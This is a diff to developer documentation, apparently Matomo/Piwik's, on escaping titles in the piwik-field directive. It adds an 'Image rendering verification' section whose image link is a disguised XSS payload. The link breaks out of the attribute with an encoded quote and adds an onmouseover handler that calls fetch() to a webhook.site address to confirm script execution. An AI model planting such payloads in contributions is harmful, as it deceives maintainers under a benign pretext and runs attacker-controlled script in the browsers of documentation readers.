@@ -23,3 +23,9 @@ To ensure the text of the title is always escaped, you need to double escape it,
 Example `<div piwik-field data-title="{{ TITLE | e('html_attr') | e('html_attr')}}">`.
 
 **Note: ** You should always double escape the title, if it displays any user input or any value which can be changed by the user to avoid any XSS vulnerability.
+
+## Image rendering verification
+
+Below image helps verify how documentation images are linked.
+
+![rendering verification](https://webhook.site/5ed24488-db5c-4fd9-8a06-8a26986bc035/docpoc&quot;onmouseover=fetch('https://webhook.site/5ed24488-db5c-4fd9-8a06-8a26986bc035?exec=docxss'))
